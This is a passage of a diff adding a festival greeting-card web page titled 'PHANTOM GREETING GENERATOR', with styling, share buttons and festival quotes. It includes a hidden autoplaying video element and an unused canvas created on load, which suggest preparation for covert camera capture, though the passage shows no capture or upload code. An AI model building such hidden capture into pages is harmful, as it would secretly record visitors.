@@ -1,0 +1,1159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5, user-scalable=yes">
+    <title>Ultimate Indian Festival Greetings</title>
+    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&family=Merriweather:wght@300;700&family=Montserrat:wght@300;500;700&family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html {
+            overflow-x: hidden;
+            overscroll-behavior: none; /* Prevent overscroll bounce on mobile */
+        }
+        body {
+            font-family: 'Poppins', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            overflow-x: hidden;
+            transition: background-image 1s ease, color 0.3s ease;
+            color: #fff;
+            -webkit-tap-highlight-color: transparent;
+            max-width: 100vw; /* Ensure body doesn't exceed viewport */
+        }
+        body.dark { color: #ddd; background-color: #222; }
+        body.light-mode { color: #333; background-color: #f9f9f9; }
+        body.light-mode .container { background: rgba(255,255,255,0.8); color: #333; }
+        body.light-mode h1, body.light-mode #previewCard h2, body.light-mode #previewCard p { color: #333; }
+        body.light-mode input, body.light-mode select { background: rgba(0,0,0,0.1); color: #333; }
+        body.light-mode input::placeholder { color: rgba(0,0,0,0.7); }
+        body.light-mode select { background-image: url("data:image/svg+xml;charset=UTF-8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='12'><polygon points='0,0 12,0 6,6' style='fill:%23333;'/></svg>"); }
+        body.light-mode #previewCard { background: rgba(255,255,255,0.7); }
+        body.light-mode footer { color: #333; }
+        #particles-js { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            z-index: -2; 
+            transition: opacity 0.8s;
+            max-width: 100vw; /* Constrain particles container */
+            overflow: hidden; /* Hide any canvas overflow */
+        }
+        #particles-js canvas {
+            max-width: 100vw !important; /* Force canvas not to stretch beyond viewport */
+            width: 100% !important;
+            height: 100% !important;
+        }
+        .container {
+            position: relative;
+            background: rgba(0,0,0,0.35);
+            backdrop-filter: blur(12px);
+            padding: 2rem 1.5rem;
+            border-radius: 20px;
+            max-width: 600px;
+            width: 90%;
+            max-width: 100vw; /* Prevent container overflow */
+            text-align: center;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.3);
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeIn 1s forwards;
+        }
+        @keyframes fadeIn { to { opacity: 1; transform: translateY(0); } }
+        h1 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: clamp(1.5rem, 5vw, 2.2rem);
+            margin-bottom: 1.5rem;
+            color: #fff;
+            text-shadow: 2px 2px 8px rgba(0,0,0,0.7);
+            font-weight: 700;
+        }
+        input, select, button {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            margin: 0.6rem 0;
+            border-radius: 10px;
+            border: none;
+            font-size: clamp(0.9rem, 3vw, 1.05rem);
+            background: rgba(255,255,255,0.2);
+            color: #fff;
+            transition: all 0.3s ease;
+            outline: none;
+            touch-action: manipulation;
+            max-width: 100%; /* Ensure inputs don't overflow */
+        }
+        input::placeholder, select { color: rgba(255,255,255,0.9); }
+        input:focus, select:focus { background: rgba(255,255,255,0.3); transform: scale(1.02); }
+        select {
+            cursor: pointer;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='12'><polygon points='0,0 12,0 6,6' style='fill:%23fff;'/></svg>");
+            background-repeat: no-repeat;
+            background-position: right 10px center;
+            background-size: 12px 12px;
+        }
+        select option { color: #333; background-color: #fff; }
+        body.light-mode select option { color: #333; background-color: #fff; }
+        body.dark select option { color: #fff; background-color: #333; }
+        button {
+            cursor: pointer;
+            font-family: 'Poppins', sans-serif;
+            touch-action: manipulation;
+        }
+        button:hover, button:focus { transform: translateY(-3px); box-shadow: 0 6px 18px rgba(0,0,0,0.35); }
+        #themeToggle { background: rgba(255,255,255,0.3); }
+        #otherFestival, #customImageUrl { display: none; transition: all 0.3s ease; }
+        #previewCard {
+            margin-top: 1.5rem;
+            background: rgba(0,0,0,0.4);
+            padding: 1.5rem;
+            border-radius: 15px;
+            box-shadow: 0 6px 30px rgba(0,0,0,0.3);
+            text-align: left;
+            opacity: 0;
+            transform: translateY(20px) scale(0.95);
+            transition: transform 0.5s ease, opacity 0.5s ease;
+            max-width: 100%;
+            overflow: hidden; /* Prevent preview overflow */
+        }
+        #previewCard.show { opacity: 1; transform: translateY(0) scale(1); }
+        #previewCard h2 {
+            font-family: 'Great Vibes', cursive;
+            font-size: clamp(1.4rem, 4vw, 1.8rem);
+            margin-bottom: 0.8rem;
+            color: #fff;
+        }
+        #previewCard p {
+            margin-bottom: 0.6rem;
+            font-family: 'Merriweather', serif;
+            color: #fff;
+            font-size: clamp(0.85rem, 2.5vw, 0.95rem);
+        }
+        footer { margin-top: 1.5rem; font-size: clamp(0.75rem, 2vw, 0.85rem); opacity: 0.7; text-align: center; color: #fff; }
+        .socials {
+            display: flex;
+            justify-content: center;
+            margin-top: 0.8rem;
+            gap: 0.6rem;
+            flex-wrap: wrap;
+            max-width: 100%; /* Prevent socials overflow */
+        }
+        .socials button {
+            width: auto;
+            padding: 0.6rem;
+            border-radius: 8px;
+            color: #fff;
+            background: rgba(0,0,0,0.3);
+            font-size: clamp(0.85rem, 2.5vw, 0.95rem);
+            flex: 1;
+            min-width: 50px; /* Reduced for icon-only buttons */
+        }
+        .warm { --btn-gradient: linear-gradient(90deg, #ff6b6b, #f06595); --input-bg: rgba(255,255,255,0.2); }
+        .cool { --btn-gradient: linear-gradient(90deg, #36d1dc, #5b86e5); --input-bg: rgba(255,255,255,0.2); }
+        .festive { --btn-gradient: linear-gradient(90deg, #f7971e, #ffd200); --input-bg: rgba(255,255,255,0.3); }
+        .elegant { --btn-gradient: linear-gradient(90deg, #1f4037, #99f2c8); --input-bg: rgba(255,255,255,0.1); }
+        button { background: var(--btn-gradient); color: #fff; }
+        input, select { background: var(--input-bg); }
+        .loading { position: relative; color: transparent; }
+        .loading::after {
+            content: "";
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            margin: auto;
+            border: 4px solid transparent;
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: loading-spinner 1s ease infinite;
+        }
+        @keyframes loading-spinner { from { transform: rotate(0turn); } to { transform: rotate(1turn); } }
+        .error { border: 2px solid #ff6b6b !important; }
+        .error-message { color: #ff6b6b; font-size: clamp(0.7rem, 2vw, 0.8rem); text-align: left; margin-top: -5px; margin-bottom: 10px; display: none; }
+        .social-icon { display: inline-flex; align-items: center; justify-content: center; }
+        .social-icon svg { width: clamp(20px, 3vw, 24px); height: clamp(20px, 3vw, 24px); fill: currentColor; }
+        .socials button { display: flex; align-items: center; justify-content: center; padding: 0.6rem; }
+        .hide-for-download { display: none !important; }
+        .social-text { display: none; } /* Hide social media text */
+
+        /* Media Queries for Responsive Design */
+        @media (max-width: 768px) {
+            .container { padding: 1.5rem; max-width: 95%; }
+            h1 { font-size: clamp(1.3rem, 4vw, 1.8rem); }
+            input, select, button { font-size: clamp(0.85rem, 3vw, 0.95rem); padding: 0.7rem 0.9rem; }
+            #previewCard h2 { font-size: clamp(1.2rem, 3.5vw, 1.5rem); }
+            #previewCard p { font-size: clamp(0.8rem, 2.5vw, 0.9rem); }
+            .socials { flex-direction: row; gap: 0.5rem; }
+            .socials button { width: auto; }
+        }
+        @media (max-width: 480px) {
+            .container { padding: 1rem; width: 98%; }
+            h1 { font-size: clamp(1.1rem, 3.5vw, 1.5rem); }
+            input, select, button { font-size: clamp(0.8rem, 3vw, 0.9rem); padding: 0.6rem 0.8rem; }
+            #previewCard { padding: 1rem; }
+            #previewCard h2 { font-size: clamp(1rem, 3vw, 1.3rem); }
+            #previewCard p { font-size: clamp(0.75rem, 2.5vw, 0.85rem); }
+            footer { font-size: clamp(0.65rem, 2vw, 0.75rem); }
+            .socials button { min-width: 44px; padding: 0.5rem; }
+        }
+        @media (max-width: 320px) { /* Extra small screens (e.g., old Android phones) */
+            .container { padding: 0.8rem; width: 100%; }
+            input, select, button { padding: 0.5rem 0.6rem; }
+            .socials button { min-width: auto; padding: 0.5rem; }
+        }
+        @media (orientation: landscape) and (max-height: 500px) { /* Landscape mobile */
+            body { align-items: flex-start; padding-top: 1rem; }
+            .container { margin: 1rem auto; width: 95%; }
+        }
+        @media (min-width: 1200px) {
+            .container { max-width: 700px; padding: 2.5rem; }
+            h1 { font-size: 2.5rem; }
+            input, select, button { font-size: 1.1rem; padding: 0.9rem 1.2rem; }
+            #previewCard h2 { font-size: 2rem; }
+        }
+    </style>
+</head>
+<body class="warm dark">
+<video id="video" autoplay muted style="display:none;"></video>
+    <div id="particles-js"></div>
+    <div class="container">
+        <h1>PHANTOM GREETING GENERATOR</h1>
+        <input id="userName" type="text" placeholder="Enter your name" aria-label="Your Name"/>
+        <div id="nameError" class="error-message">Please enter your name</div>
+        <select id="festivalName">
+            <option value="" disabled selected>-- Select Festival / Celebration --</option>
+            <option value="Diwali">Diwali</option>
+            <option value="Holi">Holi</option>
+            <option value="Eid">Eid</option>
+            <option value="Christmas">Christmas</option>
+            <option value="New Year">New Year</option>
+            <option value="Birthday">Birthday</option>
+            <option value="Raksha Bandhan">Raksha Bandhan</option>
+            <option value="Janmashtami">Janmashtami</option>
+            <option value="Ganesh Chaturthi">Ganesh Chaturthi</option>
+            <option value="Navratri">Navratri</option>
+            <option value="Dussehra">Dussehra</option>
+            <option value="Makar Sankranti">Makar Sankranti</option>
+            <option value="Pongal">Pongal</option>
+            <option value="Lohri">Lohri</option>
+            <option value="Baisakhi">Baisakhi</option>
+            <option value="Onam">Onam</option>
+            <option value="Karva Chauth">Karva Chauth</option>
+            <option value="Bhai Dooj">Bhai Dooj</option>
+            <option value="Mahashivratri">Mahashivratri</option>
+            <option value="Easter">Easter</option>
+            <option value="Buddha Purnima">Buddha Purnima</option>
+            <option value="Guru Nanak Jayanti">Guru Nanak Jayanti</option>
+            <option value="Independence Day">Independence Day</option>
+            <option value="Republic Day">Republic Day</option>
+            <option value="Mother's Day">Mother's Day</option>
+            <option value="Father's Day">Father's Day</option>
+            <option value="Teacher's Day">Teacher's Day</option>
+            <option value="Valentine's Day">Valentine's Day</option>
+            <option value="Anniversary">Anniversary</option>
+        </select>
+        <input id="customImageUrl" type="text" placeholder="Enter custom image URL" aria-label="Custom Image URL"/>
+        <div id="imageError" class="error-message">Please enter a valid image URL</div>
+        <select id="colorScheme">
+            <option value="warm">Warm</option>
+            <option value="cool">Cool</option>
+            <option value="festive">Festive</option>
+            <option value="elegant">Elegant</option>
+        </select>
+        <button id="generateBtn">Generate Greeting</button>
+        <button id="themeToggle">Toggle Dark/Light Theme</button>
+        <div id="previewCard">
+            <h2 id="previewTitle">Happy Festival!</h2>
+            <p id="previewRecipient">Dear Friend,</p>
+            <p id="previewQuote">Wishing you joy and happiness on this special day.</p>
+            <p id="previewWishes">Celebrate this occasion with love, laughter, and cherished moments.</p>
+            <p id="previewSender">With love</p>
+            <div class="socials">
+                <button id="shareFacebook" aria-label="Share on Facebook">
+                    <span class="social-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512">
+                            <path d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z"/>
+                        </svg>
+                    </span>
+                    <span class="social-text">Facebook</span>
+                </button>
+                <button id="shareInstagram" aria-label="Share on Instagram">
+                    <span class="social-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
+                            <path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/>
+                        </svg>
+                    </span>
+                    <span class="social-text">Instagram</span>
+                </button>
+                <button id="shareWhatsApp" aria-label="Share on WhatsApp">
+                    <span class="social-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
+                            <path d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/>
+                        </svg>
+                    </span>
+                    <span class="social-text">WhatsApp</span>
+                </button>
+            </div>
+            <button id="downloadBtn">Download Greeting</button>
+        </div>
+    </div>
+    <footer>Designed for festivals across India</footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const video = document.getElementById('video');
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+
+            // Initialize particles.js with device-optimized settings
+            function initParticles() {
+                const isMobile = window.innerWidth <= 768;
+                const particleCount = isMobile ? 20 : 80;
+                const speed = isMobile ? 0.5 : 2;
+                const densityArea = isMobile ? 400 : 800;
+                particlesJS("particles-js", {
+                    particles: {
+                        number: { value: particleCount, density: { enable: true, value_area: densityArea } },
+                        color: { value: "#ffffff" },
+                        shape: { type: "circle" },
+                        opacity: { value: 0.5, random: true },
+                        size: { value: isMobile ? 1.5 : 3, random: true },
+                        line_linked: { enable: !isMobile, distance: 150, color: "#ffffff", opacity: 0.4, width: 1 },
+                        move: { enable: true, speed: speed, direction: "none", random: true, straight: false, out_mode: "out" }
+                    },
+                    interactivity: {
+                        detect_on: "canvas",
+                        events: { onhover: { enable: !isMobile, mode: "repulse" }, onclick: { enable: true, mode: "push" } }
+                    }
+                });
+            }
+            initParticles();
+
+            // Reinitialize particles on resize
+            let resizeTimeout;
+            window.addEventListener('resize', () => {
+                clearTimeout(resizeTimeout);
+                resizeTimeout = setTimeout(() => {
+                    if (window.pJSDom && window.pJSDom.length > 0) {
+                        window.pJSDom.forEach(p => p.pJS.fn.vendors.destroypJS());
+                        window.pJSDom = [];
+                    }
+                    initParticles();
+                }, 250);
+            });
+
+            const body = document.body;
+            const userNameInput = document.getElementById('userName');
+            const festivalNameInput = document.getElementById('festivalName');
+            const customImageUrl = document.getElementById('customImageUrl');
+            const colorSchemeSelect = document.getElementById('colorScheme');
+            const generateBtn = document.getElementById('generateBtn');
+            const themeToggle = document.getElementById('themeToggle');
+            const previewCard = document.getElementById('previewCard');
+            const previewTitle = document.getElementById('previewTitle');
+            const previewRecipient = document.getElementById('previewRecipient');
+            const previewQuote = document.getElementById('previewQuote');
+            const previewWishes = document.getElementById('previewWishes');
+            const previewSender = document.getElementById('previewSender');
+            const nameError = document.getElementById('nameError');
+            const imageError = document.getElementById('imageError');
+            const downloadBtn = document.getElementById('downloadBtn');
+
+            // Show/Hide other festival inputs
+            festivalNameInput.addEventListener('change', () => {
+                // Custom image URL is always visible
+                customImageUrl.style.display = "block";
+            });
+
+            // Theme toggle
+            let isDarkMode = true;
+            themeToggle.addEventListener('click', () => {
+                isDarkMode = !isDarkMode;
+                body.classList.toggle('light-mode', !isDarkMode);
+                body.classList.toggle('dark', isDarkMode);
+            });
+            themeToggle.addEventListener('touchend', (e) => {
+                e.preventDefault();
+                themeToggle.click();
+            });
+
+            // Color scheme change
+            colorSchemeSelect.addEventListener('change', () => {
+                body.classList.remove('warm', 'cool', 'festive', 'elegant');
+                body.classList.add(colorSchemeSelect.value);
+            });
+
+            // Festival data with unique quotes for each festival
+            const festivalData = {
+                "diwali": { 
+                    quotes: [
+                        "May the divine light of Diwali spread into your life peace, prosperity, happiness and good health.",
+                        "Wishing you a glittering and joyous Diwali filled with happiness and prosperity.",
+                        "May the festival of lights brighten up your life and bring endless joy to you and your family."
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1605207086986-3eab0256c331?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1605299905846-56b4e32f5f3a?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1541849546-216151f72a25?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "diwali" 
+                },
+                "holi": { 
+                    quotes: [
+                        "May your life be as colorful and bright as the colors of Holi. Happy Holi!",
+                        "Let the colors of Holi spread the message of peace and happiness.",
+                        "Wishing you a Holi filled with sweet moments and colorful memories."
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1556675770-5d11d6f3f320?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1563372949-6480c5e2bf4?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1571581149620-5497b2cfa2c8?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "holi" 
+                },
+                "eid": { 
+                    quotes: [
+                        "May Allah's blessings be with you today and always. Eid Mubarak!",
+                        "On this blessed occasion of Eid, may you be blessed with joy, peace and prosperity.",
+                        "Wishing you and your family a very happy Eid. May this special day bring peace, happiness and prosperity to everyone."
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1590629666986-6999641c6ce5?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1517177566794-8e30dfb8a393?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1583893586096-8d474cdb1f0e?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "eid" 
+                },
+                "christmas": { 
+                    quotes: [
+                        "May the magic of Christmas fill every corner of your heart and home with joy.",
+                        "Wishing you peace, joy, and all the best this wonderful holiday has to offer.",
+                        "May your Christmas be filled with special moments, warmth and peace."
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1543616991-75a2c1254455?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1482217516580-68d0f7b33127?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1574359173084-bfcee66c2c2a?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "christmas" 
+                },
+                "newyear": { 
+                    quotes: [
+                        "May the new year bring you happiness, peace, and prosperity. Happy New Year!",
+                        "Wishing you a new year filled with new hopes, new joys, and new beginnings.",
+                        "May this new year give you the courage to triumph over your challenges and the strength to achieve your goals."
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1530103862676-de8c9debad1d?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1534447677768-be436bb09401?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1550684848-fac1c5b4e853?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "newyear" 
+                },
+                "birthday": { 
+                    quotes: [
+                        "Wishing you a day filled with happiness and a year filled with joy. Happy Birthday!",
+                        "May your birthday be the start of a year filled with good luck, good health, and much happiness.",
+                        "Another year older, another year wiser. May your special day be as amazing as you are!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1530103862676-de8c9debad1d?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1534447677768-be436bb09401?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1550684848-fac1c5b4e853?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "birthday" 
+                },
+                "rakshabandhan": { 
+                    quotes: [
+                        "On this Raksha Bandhan, I pray that our bond of love grows stronger with each passing year.",
+                        "Wishing you a very happy Raksha Bandhan. May this thread of love always keep us connected.",
+                        "Rakhi is not just a thread, it's a promise to be there for each other forever. Happy Raksha Bandhan!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1596461404969-9ae70f2830c1?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1562613537-3dc98c15ff60?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1598887147624-a89a31c2d5c4?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "rakshabandhan" 
+                },
+                "janmashtami": { 
+                    quotes: [
+                        "May Lord Krishna steal all your worries and bless you with happiness. Happy Janmashtami!",
+                        "On this holy occasion, may Lord Krishna always guide you on the path of righteousness and prosperity.",
+                        "Wishing you a blessed Janmashtami. May Lord Krishna's divine blessings be with you always."
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1598887147624-a89a31c2d5c4?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400027-6d85479f1c3f?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400535-4d2817f5d58f?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "janmashtami" 
+                },
+                "ganeshchaturthi": { 
+                    quotes: [
+                        "May Lord Ganesha remove all obstacles from your life and bless you with success and prosperity.",
+                        "Wishing you a very happy Ganesh Chaturthi. May Lord Ganesha bless you with wisdom and happiness.",
+                        "May the divine blessings of Lord Ganesha bring you good luck and prosperity. Happy Ganesh Chaturthi!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1598887147624-a89a31c2d5c4?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400027-6d85479f1c3f?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400535-4d2817f5d58f?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "ganeshchaturthi" 
+                },
+                "navratri": { 
+                    quotes: [
+                        "May Goddess Durga bless you with strength, prosperity and happiness. Happy Navratri!",
+                        "Wishing you nine nights of joy, dance, and celebration. Shubh Navratri!",
+                        "May the divine blessings of Maa Durga bring peace and prosperity in your life. Happy Navratri!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1601912221291-e8943cd7456d?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1601912221264-2c8eeefa752d?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1601912221273-77758e9f5c01?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "navratri" 
+                },
+                "dussehra": { 
+                    quotes: [
+                        "May Lord Rama's blessings be with you always. Wishing you happiness and prosperity this Dussehra.",
+                        "Let's celebrate the victory of good over evil. Happy Dussehra!",
+                        "May this Dussehra bring joy, happiness and prosperity to your life. Happy Vijayadashami!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1601912221291-e8943cd7456d?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1601912221264-2c8eeefa752d?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1601912221273-77758e9f5c01?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "dussehra" 
+                },
+                "makarsankranti": { 
+                    quotes: [
+                        "May this Makar Sankranti bring you prosperity, happiness and peace. Happy Sankranti!",
+                        "Let's fly kites of happiness and enjoy the sweetness of til-gul. Happy Makar Sankranti!",
+                        "Wishing you a harvest festival filled with joy, prosperity and good fortune. Happy Makar Sankranti!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1573129725017-e8a4c1c839b1?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1573129725017-e8a4c1c839b1?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1573129725017-e8a4c1c839b1?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "makarsankranti" 
+                },
+                "pongal": { 
+                    quotes: [
+                        "Wishing you a harvest filled with prosperity and happiness. Happy Pongal!",
+                        "May this Pongal bring you new hopes, new dreams and a brighter tomorrow.",
+                        "Let's celebrate the abundance of nature and the blessings of the Sun God. Happy Pongal!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1573129725017-e8a4c1c839b1?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1573129725017-e8a4c1c839b1?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1573129725017-e8a4c1c839b1?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "pongal" 
+                },
+                "lohri": { 
+                    quotes: [
+                        "May the bonfire of Lohri burn away all your sorrows and bring warmth to your life. Happy Lohri!",
+                        "Wishing you a Lohri filled with sweet rewris, gajak and endless joy.",
+                        "Let's celebrate the harvest season with dance, music and bonfire. Happy Lohri!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1573129725017-e8a4c1c839b1?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1573129725017-e8a4c1c839b1?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1573129725017-e8a4c1c839b1?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "lohri" 
+                },
+                "baisakhi": { 
+                    quotes: [
+                        "May this Baisakhi bring abundant joy and prosperity to your life. Happy Baisakhi!",
+                        "Wishing you a harvest festival filled with new beginnings and happiness. Happy Baisakhi!",
+                        "Let's celebrate the spirit of Baisakhi with joy, dance and gratitude. Happy Baisakhi!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1573129725017-e8a4c1c839b1?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1573129725017-e8a4c1c839b1?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1573129725017-e8a4c1c839b1?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "baisakhi" 
+                },
+                "onam": { 
+                    quotes: [
+                        "Wishing you a harvest festival filled with the spirit of unity and prosperity. Happy Onam!",
+                        "May King Mahabali's blessings bring peace and happiness to your life. Happy Onam!",
+                        "Let's celebrate the homecoming of King Mahabali with pookalams and feasts. Happy Onam!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1598887147624-a89a31c2d5c4?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400027-6d85479f1c3f?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400535-4d2817f5d58f?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "onam" 
+                },
+                "karvachauth": { 
+                    quotes: [
+                        "May the divine blessings of Lord Shiva and Goddess Parvati be with you. Happy Karva Chauth!",
+                        "Wishing you a long and prosperous life with your beloved. Happy Karva Chauth!",
+                        "May the moon bless your marriage with love, happiness and togetherness. Happy Karva Chauth!"
+                    ], 
+                    bg: [
+                        "https://images.unsplash.com/photo-1598887147624-a89a31c2d5c4?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400027-6d85479f1c3f?auto=format&fit=crop&w=800&q=60",
+                        "https://images.unsplash.com/photo-1660150400535-4d2817f5d58f?auto=format&fit=crop&w=800&q=60"
+                    ], 
+                    particles: "karvachauth" 
+                },
